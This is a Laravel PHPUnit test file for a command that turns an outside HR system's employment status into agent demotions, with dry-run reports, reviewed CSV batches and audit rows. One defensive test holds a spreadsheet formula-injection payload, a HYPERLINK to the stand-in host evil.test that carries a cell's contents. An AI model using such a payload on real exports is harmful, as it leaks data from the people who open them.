<?php

namespace Tests\Feature;

use App\Models\Agent;
use App\Services\Agent\AgentCachePurger;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Schema;
use Mockery;
use Mockery\MockInterface;
use Tests\Concerns\CreatesAuthTables;
use Tests\Concerns\CreatesListingTables;
use Tests\Concerns\FakesLrAgentStatus;
use Tests\TestCase;

/**
 * agents:apply-lr-status — the only thing that changes agents.status from what
 * LR said. Demoting an agent pulls their listings off the public site and the
 * sitemap, so it is a report unless --force, and --force is always an explicit,
 * reviewed batch: named statuses, a reviewed list (or a limit), and LR asked
 * again just before each demotion.
 *
 * Every LR request is faked; in-memory sqlite.
 */
class ApplyLrAgentStatusTest extends TestCase
{
    use CreatesAuthTables, CreatesListingTables, FakesLrAgentStatus;

    private MockInterface $purger;

    protected function setUp(): void
    {
        parent::setUp();

        $this->createAuthTables();
        $this->createListingTables();
        Schema::create('team_agents', function (Blueprint $table) {
            $table->id();
            $table->unsignedBigInteger('team_id')->default(1);
            $table->unsignedBigInteger('agent_id');
            $table->boolean('is_leader')->default(false);
            $table->string('status')->default('active');
            $table->timestamps();
        });

        config(['lr_status.sleep_ms' => 0, 'lr_status.backoff_seconds' => 0]);
        $this->purger = $this->spy(AgentCachePurger::class);
    }

    // ── fixtures ───────────────────────────────────────────────────────────

    /** @param  array<string, mixed>  $agent */
    private function agent(string $email, array $agent = [], string $role = 'agent'): int
    {
        $userId = DB::table('users')->insertGetId([
            'name' => $email, 'email' => $email, 'password' => 'x',
            'role_id' => $this->roleId($role), 'last_online_at' => now()->subDays(3),
        ]);

        return DB::table('agents')->insertGetId($agent + [
            'user_id' => $userId, 'first_name' => 'Agent', 'last_name' => 'Test',
            'status' => 'active', 'created_at' => now(), 'updated_at' => now(),
        ]);
    }

    /** An FH-active agent the sync has already recorded as `$lrStatus`. */
    private function recorded(string $email, string $lrStatus, array $extra = [], string $role = 'agent'): int
    {
        return $this->agent($email, $extra + [
            'lr_employment_lookup' => 'found',
            'lr_employment_status' => $lrStatus,
            'lr_employment_checked_at' => now()->subHours(2),
        ], $role);
    }

    private function row(int $agentId): object
    {
        return DB::table('agents')->where('id', $agentId)->first();
    }

    private function adminSetStatus(int $agentId, Carbon|string $when): void
    {
        DB::table('audits')->insert([
            'event' => 'updated', 'auditable_type' => Agent::class, 'auditable_id' => $agentId,
            'source' => 'admin_status_dropdown', 'created_at' => $when, 'updated_at' => $when,
        ]);
    }

    private function listing(int $agentId, array $listing = []): void
    {
        $propertyId = DB::table('properties')->insertGetId(['status' => 'active']);
        DB::table('listings')->insert($listing + [
            'code' => 'FH-'.uniqid(), 'name' => 'Listing', 'property_id' => $propertyId, 'agent_id' => $agentId,
            'visibility' => 'public', 'created_at' => now(), 'updated_at' => now(),
        ]);
    }

    /** @return array{0: int, 1: string} exit code, output */
    private function run_(array $args = []): array
    {
        $code = Artisan::call('agents:apply-lr-status', $args);

        return [$code, Artisan::output()];
    }

    /** @return list<string> */
    private function csv(string $line): array
    {
        return str_getcsv($line, ',', '"', '');
    }

    private function auditRows(int $agentId)
    {
        return DB::table('audits')->where('auditable_type', Agent::class)->where('auditable_id', $agentId)->where('source', 'lr_sync');
    }

    // ── the report ─────────────────────────────────────────────────────────

    public function test_the_report_counts_the_cohort_per_lr_status_and_changes_nothing(): void
    {
        $ids = [
            $this->recorded('t@example.test', 'terminated'),
            $this->recorded('i1@example.test', 'inactive'),
            $this->recorded('i2@example.test', 'inactive'),
            $this->recorded('r@example.test', 'resigned'),
            $this->recorded('ok@example.test', 'active'),
        ];

        [$code, $out] = $this->run_();

        $this->assertSame(0, $code);
        $this->assertMatchesRegularExpression('/terminated\s+1\b/', $out);
        $this->assertMatchesRegularExpression('/inactive\s+2\b/', $out);
        $this->assertMatchesRegularExpression('/resigned\s+1\b/', $out);
        $this->assertStringContainsString('Dry run — nothing was changed', $out);
        foreach ($ids as $id) {
            $this->assertSame('active', $this->row($id)->status);
        }
    }

    public function test_the_report_says_what_it_ignores(): void
    {
        $this->recorded('back@example.test', 'active', ['status' => 'resigned']);
        $this->agent('stranger@example.test', ['lr_employment_lookup' => 'not_found', 'lr_employment_checked_at' => now()]);
        $this->agent('flaky@example.test', ['lr_employment_lookup' => 'error', 'lr_employment_checked_at' => now()]);
        $this->agent('new@example.test');
        $this->recorded('odd@example.test', 'deactivated');
        // Already switched off in FH: not a candidate, and not "LR active again" either.
        $this->recorded('already@example.test', 'terminated', ['status' => 'resigned']);

        [, $out] = $this->run_();

        $this->assertMatchesRegularExpression('/LR active again[^\n]*\b1\b/', $out);
        $this->assertMatchesRegularExpression('/not found in LR[^\n]*\b1\b/', $out);
        $this->assertMatchesRegularExpression('/lookup failed[^\n]*\b1\b/', $out);
        $this->assertMatchesRegularExpression('/not asked yet[^\n]*\b1\b/', $out);
        $this->assertMatchesRegularExpression('/unrecognised LR value[^\n]*\b1\b[^\n]*deactivated/', $out);
    }

    public function test_the_report_never_calls_lr_and_is_logged(): void
    {
        Http::preventStrayRequests();
        Http::fake();
        Log::spy();
        $this->recorded('t@example.test', 'terminated');

        $this->run_();

        Http::assertNothingSent();
        Log::shouldHaveReceived('info')
            ->with('LR status apply (report)', Mockery::on(fn ($ctx) => ($ctx['candidates'] ?? null) === 1))
            ->once();
    }

    public function test_staff_blocked_and_removed_agents_are_never_candidates(): void
    {
        $this->recorded('boss@example.test', 'inactive', [], 'admin');
        $this->recorded('desk@example.test', 'terminated', [], 'secretary');
        $this->recorded('away@example.test', 'inactive', ['status' => 'resigned']);
        $this->recorded('gone@example.test', 'inactive', ['deleted_at' => now()]);
        $this->recorded('stale@example.test', 'inactive', ['lr_employment_lookup' => 'error']);

        [, $out] = $this->run_(['--csv' => true]);

        $this->assertSame(['agent_id'], array_map(fn ($line) => $this->csv($line)[0], array_filter(explode("\n", trim($out)))), 'header only');
    }

    public function test_csv_prints_only_csv_with_the_review_columns(): void
    {
        $leader = $this->recorded('ana@example.test', 'terminated', ['first_name' => 'Ana', 'last_name' => 'Reyes']);
        $this->listing($leader);
        $this->listing($leader);
        $this->listing($leader, ['visibility' => 'private']);
        $this->listing($leader, ['verification_status' => 'flagged']);
        DB::table('team_agents')->insert(['agent_id' => $leader, 'is_leader' => true, 'status' => 'active']);
        $this->recorded('bo@example.test', 'inactive');

        [$code, $out] = $this->run_(['--csv' => true]);

        $this->assertSame(0, $code);
        $lines = array_values(array_filter(explode("\n", trim($out))));
        $rows = array_map(fn ($line) => $this->csv($line), $lines);
        $this->assertSame(
            ['agent_id', 'name', 'email', 'lr_status', 'lr_checked_at', 'last_online', 'public_listings', 'team_leader', 'admin_set'],
            $rows[0],
        );
        $this->assertCount(3, $rows);
        foreach ($rows as $row) {
            $this->assertCount(9, $row, 'every line is a CSV row, so the output can be redirected to a file');
        }
        $this->assertSame([(string) $leader, 'Ana Reyes', 'ana@example.test', 'terminated'], array_slice($rows[1], 0, 4));
        $this->assertSame(['2', 'yes', 'no'], array_slice($rows[1], 6, 3), 'private and flagged listings are not what leaves the site');
        $this->assertSame(['0', 'no', 'no'], array_slice($rows[2], 6, 3));
    }

    public function test_admin_set_agents_are_flagged_when_an_admin_decided_after_lr_changed(): void
    {
        $changedAt = Carbon::now()->subDays(5);
        // Never changed (first observation) and an admin set it at some point: held.
        $first = $this->recorded('first@example.test', 'inactive');
        $this->adminSetStatus($first, now()->subDays(60));
        // The admin decided BEFORE LR changed its mind: LR's newer word wins.
        $before = $this->recorded('before@example.test', 'inactive', ['lr_employment_changed_at' => $changedAt]);
        $this->adminSetStatus($before, now()->subDays(20));
        // The admin decided AFTER LR changed: held.
        $after = $this->recorded('after@example.test', 'inactive', ['lr_employment_changed_at' => $changedAt]);
        $this->adminSetStatus($after, now()->subDays(1));
        // No admin involvement at all.
        $this->recorded('free@example.test', 'inactive');

        [, $out] = $this->run_(['--csv' => true]);

        $held = [];
        foreach (array_slice(array_map(fn ($line) => $this->csv($line), array_filter(explode("\n", trim($out)))), 1) as $row) {
            $held[$row[2]] = $row[8];
        }
        $this->assertSame([
            'first@example.test' => 'yes',
            'before@example.test' => 'no',
            'after@example.test' => 'yes',
            'free@example.test' => 'no',
        ], $held);

        [, $report] = $this->run_();
        $this->assertMatchesRegularExpression('/Held[^\n]*\b2\b/', $report);
    }

    // ── applying ───────────────────────────────────────────────────────────

    public function test_force_needs_named_statuses_and_a_reviewed_list_or_a_limit(): void
    {
        $id = $this->recorded('t@example.test', 'terminated');
        Http::preventStrayRequests();
        Http::fake();

        [$code, $out] = $this->run_(['--force' => true]);
        $this->assertSame(1, $code);
        $this->assertStringContainsString('--status', $out);

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'terminated']);
        $this->assertSame(1, $code);
        $this->assertStringContainsString('--from-csv', $out);

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'fired', '--limit' => 5]);
        $this->assertSame(1, $code);
        $this->assertStringContainsString('inactive, resigned, terminated', $out);

        // deactivated is FH's own dormancy status; LR never sets it.
        [$code] = $this->run_(['--force' => true, '--status' => 'deactivated', '--limit' => 5]);
        $this->assertSame(1, $code);

        [$code] = $this->run_(['--force' => true, '--csv' => true, '--status' => 'terminated', '--limit' => 5]);
        $this->assertSame(1, $code);

        // A limit alone takes agents from the LIVE cohort, so a big one must be a reviewed list.
        [$code, $out] = $this->run_(['--force' => true, '--status' => 'terminated', '--limit' => 51]);
        $this->assertSame(1, $code);
        $this->assertStringContainsString('--from-csv', $out);

        // A typo must not quietly become "no limit" or "no pause".
        foreach ([['--limit' => 'abc'], ['--limit' => '-5'], ['--sleep-ms' => '1s']] as $bad) {
            [$code] = $this->run_($bad + ['--force' => true, '--status' => 'terminated', '--limit' => 5]);
            $this->assertSame(1, $code, json_encode($bad));
        }

        Http::assertNothingSent();
        $this->assertSame('active', $this->row($id)->status);
    }

    public function test_force_demotes_the_named_statuses_with_an_audit_row_and_a_cache_purge(): void
    {
        $terminated = $this->recorded('t@example.test', 'terminated');
        $resigned = $this->recorded('r@example.test', 'resigned');
        $inactive = $this->recorded('i@example.test', 'inactive');
        $this->lr([
            't@example.test' => $this->lrHit('terminated'),
            'r@example.test' => $this->lrHit('resigned'),
            'i@example.test' => $this->lrHit('inactive'),
        ]);

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'terminated,resigned', '--limit' => 10]);

        $this->assertSame(0, $code);
        $this->assertSame('terminated', $this->row($terminated)->status);
        $this->assertSame('resigned', $this->row($resigned)->status);
        $this->assertSame('active', $this->row($inactive)->status, 'inactive was not one of the named statuses');
        $this->assertStringContainsString('Demoted 2', $out);

        $this->assertSame(['t@example.test', 'r@example.test'], $this->asked(), 'LR is asked again, and only about the agents being demoted');

        $audit = $this->auditRows($terminated)->first();
        $this->assertNotNull($audit, 'the CLI must write an audit row (audit.console is off by default)');
        $this->assertSame('LR status: terminated → terminated', $audit->description);
        $this->assertStringContainsString('terminated', (string) $audit->new_values);
        $this->assertLessThan(500, strlen($audit->description));

        $this->purger->shouldHaveReceived('purgeAgent')->with($terminated, true)->once();
        $this->purger->shouldHaveReceived('purgeAgent')->with($resigned, true)->once();
        $this->purger->shouldNotHaveReceived('purgeAgent', [$inactive, true]);
    }

    public function test_force_asks_lr_again_and_skips_what_changed_or_failed(): void
    {
        $changedMind = $this->recorded('changed@example.test', 'terminated');
        $outage = $this->recorded('outage@example.test', 'terminated');
        $unknown = $this->recorded('unknown@example.test', 'terminated');
        $throttled = $this->recorded('throttled@example.test', 'terminated');
        $fine = $this->recorded('fine@example.test', 'terminated');
        $this->lr([
            'changed@example.test' => $this->lrHit('active'),
            'outage@example.test' => Http::response('', 500),
            'unknown@example.test' => $this->lrMiss(),
            'throttled@example.test' => Http::response('', 429, ['X-RateLimit-Remaining' => '0']),
            'fine@example.test' => $this->lrHit('terminated'),
        ]);

        [, $out] = $this->run_(['--force' => true, '--status' => 'terminated', '--limit' => 10]);

        foreach ([$changedMind, $outage, $unknown, $throttled] as $id) {
            $this->assertSame('active', $this->row($id)->status);
        }
        $this->assertSame('terminated', $this->row($fine)->status);
        $this->assertStringContainsString('Demoted 1', $out);

        // The fresh answers are kept, so the next report is current.
        $this->assertSame('active', $this->row($changedMind)->lr_employment_status);
        $this->assertNotNull($this->row($changedMind)->lr_employment_changed_at);
        $this->assertSame('error', $this->row($outage)->lr_employment_lookup);
        $this->assertSame('not_found', $this->row($unknown)->lr_employment_lookup);
        $this->assertSame('found', $this->row($throttled)->lr_employment_lookup, 'a throttled call says nothing about the agent');
    }

    public function test_force_leaves_admin_set_agents_alone_without_even_asking_lr(): void
    {
        $held = $this->recorded('held@example.test', 'inactive');
        $this->adminSetStatus($held, now()->subDays(30));
        $free = $this->recorded('free@example.test', 'inactive');
        $this->lr(['held@example.test' => $this->lrHit('inactive'), 'free@example.test' => $this->lrHit('inactive')]);

        [, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 10]);

        $this->assertSame('active', $this->row($held)->status);
        $this->assertSame('inactive', $this->row($free)->status);
        $this->assertSame(['free@example.test'], $this->asked());
        $this->assertMatchesRegularExpression('/held[^\n]*\b1\b/i', $out);
    }

    public function test_from_csv_applies_only_the_reviewed_ids(): void
    {
        $a = $this->recorded('a@example.test', 'inactive');
        $b = $this->recorded('b@example.test', 'inactive');
        $c = $this->recorded('c@example.test', 'inactive');
        $this->lr([
            'a@example.test' => $this->lrHit('inactive'),
            'b@example.test' => $this->lrHit('inactive'),
            'c@example.test' => $this->lrHit('inactive'),
        ]);

        // The reviewer kept a and c, deleted b's row, and left an id that was never a candidate.
        $path = storage_path('framework/testing/lr-reviewed-'.uniqid().'.csv');
        File::ensureDirectoryExists(dirname($path));
        file_put_contents($path, "agent_id,name,email\n{$a},A,a@example.test\n{$c},C,c@example.test\n999999,Nobody,x@example.test\n");

        try {
            [$code, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--from-csv' => $path]);
        } finally {
            File::delete($path);
        }

        $this->assertSame(0, $code);
        $this->assertSame('inactive', $this->row($a)->status);
        $this->assertSame('active', $this->row($b)->status, 'b was not in the reviewed list');
        $this->assertSame('inactive', $this->row($c)->status);
        $this->assertMatchesRegularExpression('/1 id[^\n]*not (in|a)/i', $out);
    }

    public function test_an_unreadable_reviewed_list_stops_the_run(): void
    {
        $id = $this->recorded('a@example.test', 'inactive');

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--from-csv' => storage_path('framework/testing/does-not-exist.csv')]);

        $this->assertSame(1, $code);
        $this->assertStringContainsString('--from-csv', $out);
        $this->assertSame('active', $this->row($id)->status);
    }

    public function test_exclude_drops_ids_and_limit_caps_what_is_left(): void
    {
        $ids = [];
        foreach (range(1, 4) as $n) {
            $ids[$n] = $this->recorded("a{$n}@example.test", 'inactive');
        }
        $this->lr(array_combine(
            array_map(fn ($n) => "a{$n}@example.test", range(1, 4)),
            array_map(fn () => $this->lrHit('inactive'), range(1, 4)),
        ));

        $this->run_(['--force' => true, '--status' => 'inactive', '--exclude' => (string) $ids[2], '--limit' => 2]);

        $this->assertSame('inactive', $this->row($ids[1])->status);
        $this->assertSame('active', $this->row($ids[2])->status, 'excluded');
        $this->assertSame('inactive', $this->row($ids[3])->status);
        $this->assertSame('active', $this->row($ids[4])->status, 'beyond the limit');
    }

    public function test_an_agent_changed_by_someone_else_mid_run_is_not_overwritten(): void
    {
        $id = $this->recorded('a@example.test', 'terminated');
        Http::preventStrayRequests();
        Http::fake(function (Request $request) use ($id) {
            // An admin sets them resigned while the run is waiting on LR.
            DB::table('agents')->where('id', $id)->update(['status' => 'resigned']);

            return $this->lrReply($this->askedAbout($request), 'terminated');
        });

        [, $out] = $this->run_(['--force' => true, '--status' => 'terminated', '--limit' => 5]);

        $this->assertSame('resigned', $this->row($id)->status);
        $this->assertSame(0, $this->auditRows($id)->count());
        $this->assertStringContainsString('Demoted 0', $out);
    }

    public function test_an_admin_deciding_mid_run_still_holds_the_agent(): void
    {
        // The candidate list was read before the admin acted, so the pre-filter
        // can't know. The check inside the transaction is what keeps the
        // admin's decision from being undone.
        $id = $this->recorded('a@example.test', 'inactive');
        Http::preventStrayRequests();
        Http::fake(function (Request $request) use ($id) {
            $this->adminSetStatus($id, now());

            return $this->lrReply($this->askedAbout($request), 'inactive');
        });

        [, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 5]);

        $this->assertSame('active', $this->row($id)->status);
        $this->assertSame(0, $this->auditRows($id)->count());
        $this->assertMatchesRegularExpression('/held[^\n]*\b1\b/i', $out);
    }

    public function test_the_report_previews_the_batch_force_would_apply(): void
    {
        $ids = [];
        foreach (range(1, 4) as $n) {
            $ids[$n] = $this->recorded("a{$n}@example.test", 'inactive');
        }
        $path = storage_path('framework/testing/lr-preview-'.uniqid().'.csv');
        File::ensureDirectoryExists(dirname($path));
        file_put_contents($path, "agent_id\n{$ids[1]}\n{$ids[3]}\n{$ids[4]}\n999999\n");

        try {
            [$code, $out] = $this->run_(['--from-csv' => $path, '--exclude' => (string) $ids[4], '--limit' => 5, '--status' => 'inactive']);
            [, $csv] = $this->run_(['--from-csv' => $path, '--exclude' => (string) $ids[4], '--csv' => true, '--status' => 'inactive']);
        } finally {
            File::delete($path);
        }

        $this->assertSame(0, $code);
        $this->assertMatchesRegularExpression('/This batch[^\n]*\b2 agents\b[^\n]*inactive 2/', $out);
        $this->assertMatchesRegularExpression('/1 id[^\n]*not a candidate/', $out);
        $this->assertStringContainsString('Dry run', $out);

        $rows = array_map(fn ($line) => $this->csv($line), array_values(array_filter(explode("\n", trim($csv)))));
        $this->assertSame([(string) $ids[1], (string) $ids[3]], array_column(array_slice($rows, 1), 0), 'the CSV of a narrowed report is exactly the batch');
        foreach ($ids as $id) {
            $this->assertSame('active', $this->row($id)->status, 'a report changes nothing');
        }
    }

    public function test_csv_neutralises_spreadsheet_formulas_and_still_round_trips(): void
    {
        // Names and emails are typed by agents; the reviewers open this in Excel or Sheets.
        $evil = $this->recorded('+cmd@example.test', 'inactive', ['first_name' => '=HYPERLINK("http://evil.test/?"&C2,"x")', 'last_name' => '@SUM(1)']);
        $minus = $this->recorded('-x@example.test', 'inactive', ['first_name' => 'Minus', 'last_name' => 'Plain']);
        $fine = $this->recorded('fine@example.test', 'inactive', ['first_name' => 'Ana', 'last_name' => 'O\'Neil']);

        [, $out] = $this->run_(['--csv' => true]);

        $rows = array_map(fn ($line) => $this->csv($line), array_values(array_filter(explode("\n", trim($out)))));
        $byId = array_column(array_slice($rows, 1), null, 0);

        $this->assertSame("'=HYPERLINK(\"http://evil.test/?\"&C2,\"x\") @SUM(1)", $byId[(string) $evil][1]);
        $this->assertSame("'+cmd@example.test", $byId[(string) $evil][2]);
        $this->assertSame("'-x@example.test", $byId[(string) $minus][2]);
        $this->assertSame("Ana O'Neil", $byId[(string) $fine][1], 'ordinary values are left exactly as they are');
        $this->assertSame('fine@example.test', $byId[(string) $fine][2]);

        // The file a reviewer saves must still be usable as the reviewed list.
        $path = storage_path('framework/testing/lr-roundtrip-'.uniqid().'.csv');
        File::ensureDirectoryExists(dirname($path));
        file_put_contents($path, $out);
        $this->lr([
            '+cmd@example.test' => $this->lrHit('inactive'),
            '-x@example.test' => $this->lrHit('inactive'),
            'fine@example.test' => $this->lrHit('inactive'),
        ]);
        try {
            [$code] = $this->run_(['--force' => true, '--status' => 'inactive', '--from-csv' => $path]);
        } finally {
            File::delete($path);
        }
        $this->assertSame(0, $code);
        foreach ([$evil, $minus, $fine] as $id) {
            $this->assertSame('inactive', $this->row($id)->status);
        }
    }

    public function test_every_character_a_spreadsheet_treats_as_a_formula_start_is_neutralised(): void
    {
        $command = $this->app->make(\App\Console\Commands\ApplyLrAgentStatus::class);
        $safe = new \ReflectionMethod($command, 'spreadsheetSafe');

        $cases = [
            '=1+1' => "'=1+1", '+1' => "'+1", '-1' => "'-1", '@a' => "'@a",
            "\tx" => "'\tx", "\rx" => "'\rx",
            // ordinary values, and ones that merely CONTAIN those characters, are untouched
            'plain' => 'plain', '' => '', "O'Neil" => "O'Neil", '1=1' => '1=1', 'a@b.test' => 'a@b.test', '2026-11-18 10:00:00' => '2026-11-18 10:00:00',
        ];
        foreach ($cases as $in => $out) {
            $this->assertSame($out, $safe->invoke($command, (string) $in), var_export($in, true));
        }
    }

    public function test_the_scheduled_report_leaves_email_addresses_out_of_its_output(): void
    {
        // The scheduler is not interactive and its output goes to the scheduler's
        // log on ECS; a sample of agents' emails doesn't belong there.
        $this->recorded('someone.private@example.test', 'inactive');

        [, $atTheTerminal] = $this->run_();
        $this->assertStringContainsString('someone.private@example.test', $atTheTerminal);

        [$code, $scheduled] = $this->run_(['--no-interaction' => true]);
        $this->assertSame(0, $code);
        $this->assertStringNotContainsString('someone.private@example.test', $scheduled);
        $this->assertMatchesRegularExpression('/inactive\s+1\b/', $scheduled, 'the counts are still reported');
    }

    public function test_three_429s_in_a_row_end_the_run_without_demoting_anyone(): void
    {
        foreach (range(1, 5) as $n) {
            $this->recorded("a{$n}@example.test", 'inactive');
        }
        $this->lr(array_combine(
            array_map(fn ($n) => "a{$n}@example.test", range(1, 5)),
            array_fill(0, 5, Http::response('', 429, ['X-RateLimit-Remaining' => '0'])),
        ));

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 10]);

        $this->assertSame(0, $code);
        $this->assertCount(3, $this->asked());
        $this->assertStringContainsString('rate-limiting', $out);
        $this->assertStringContainsString('Demoted 0', $out);
        $this->assertSame(0, DB::table('agents')->where('status', '!=', 'active')->count());
    }

    public function test_a_low_rate_limit_budget_is_noticed(): void
    {
        $this->recorded('a@example.test', 'inactive');
        $this->lr(['a@example.test' => $this->lrHit('inactive', remaining: 3)]);

        [, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 5]);

        $this->assertStringContainsString('budget low', $out);
        $this->assertStringContainsString('Demoted 1', $out, 'giving way is a pause, not a stop');
    }

    public function test_one_agent_failing_does_not_stop_the_run_and_the_rest_are_still_purged(): void
    {
        $first = $this->recorded('first@example.test', 'inactive');
        $broken = $this->recorded('broken@example.test', 'inactive');
        $last = $this->recorded('last@example.test', 'inactive');
        // The database refuses any write to one agent — as a bad value or a deadlock would.
        DB::unprepared("CREATE TRIGGER refuse_one BEFORE UPDATE ON agents WHEN NEW.id = {$broken} BEGIN SELECT RAISE(ABORT, 'boom'); END;");
        $this->lr([
            'first@example.test' => $this->lrHit('inactive'),
            'broken@example.test' => $this->lrHit('inactive'),
            'last@example.test' => $this->lrHit('inactive'),
        ]);

        [$code, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 10]);

        $this->assertSame(0, $code);
        $this->assertSame('inactive', $this->row($first)->status);
        $this->assertSame('active', $this->row($broken)->status);
        $this->assertSame('inactive', $this->row($last)->status, 'the agent after the failure is still processed');
        $this->assertStringContainsString('Demoted 2', $out);
        $this->assertMatchesRegularExpression('/lookup failed: 1/', $out);
        $this->purger->shouldHaveReceived('purgeAgent')->with($first, true)->once();
        $this->purger->shouldHaveReceived('purgeAgent')->with($last, true)->once();
    }

    public function test_an_agent_promoted_to_admin_while_the_run_waits_is_not_demoted(): void
    {
        $id = $this->recorded('a@example.test', 'inactive');
        Http::preventStrayRequests();
        Http::fake(function (Request $request) {
            DB::table('users')->where('email', 'a@example.test')->update(['role_id' => $this->roleId('admin')]);

            return $this->lrReply($this->askedAbout($request), 'inactive');
        });

        [, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 5]);

        $this->assertSame('active', $this->row($id)->status, 'an admin\'s listings would vanish from the public site');
        $this->assertStringContainsString('Demoted 0', $out);
        $this->assertMatchesRegularExpression('/no longer eligible: 1/', $out);
    }

    public function test_a_big_batch_purges_the_directory_once_instead_of_every_agent(): void
    {
        config(['lr_status.max_unreviewed_batch' => 500]);
        foreach (range(1, 201) as $n) {
            $this->recorded("bulk{$n}@example.test", 'inactive');
        }
        Http::preventStrayRequests();
        Http::fake(fn (Request $request) => $this->lrReply($this->askedAbout($request), 'inactive'));

        [, $out] = $this->run_(['--force' => true, '--status' => 'inactive', '--limit' => 500]);

        $this->assertStringContainsString('Demoted 201', $out);
        $this->purger->shouldHaveReceived('purgeDirectory')->once();
        $this->purger->shouldNotHaveReceived('purgeAgent');
    }
}
